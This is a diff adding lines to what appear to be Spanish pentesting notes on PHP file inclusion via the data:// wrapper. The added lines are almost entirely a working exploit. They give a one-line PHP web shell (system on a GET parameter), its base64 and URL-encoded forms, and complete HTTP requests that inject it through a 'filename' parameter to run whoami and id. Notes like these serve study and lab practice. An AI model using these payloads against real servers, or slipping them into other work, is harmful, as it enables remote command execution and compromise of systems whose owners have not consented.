@@ -3385,7 +3385,21 @@ GET /?filename=data://text/plain;base64,textoEnBase64+&cmd=whoami HTTP/1.1 # El 
 # Lo seleccionamos y con ctrl + u estaremos encodeando el "+" a %2b
 # Ahora sí hacemos ctrl + space y deberiamos poder ver la salida
 
-GET /?filename=data://text/plain;base64,textoEnBase64+&cmd=id HTTP/1.1 # Ctrl + space
+
+
+
+
+
+<?php system($_GET["cmd"]); ?> # Esto lo convertimos a base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ # El resultado de conversion a base64
+
+PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b # URL encodeamos el signo de + = %2b
+
+GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=whoami HTTP/1.1 # Ctrl + space
+
+GET /?filename=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2b&cmd=id HTTP/1.1 # Ctrl + space
+
 
 
 
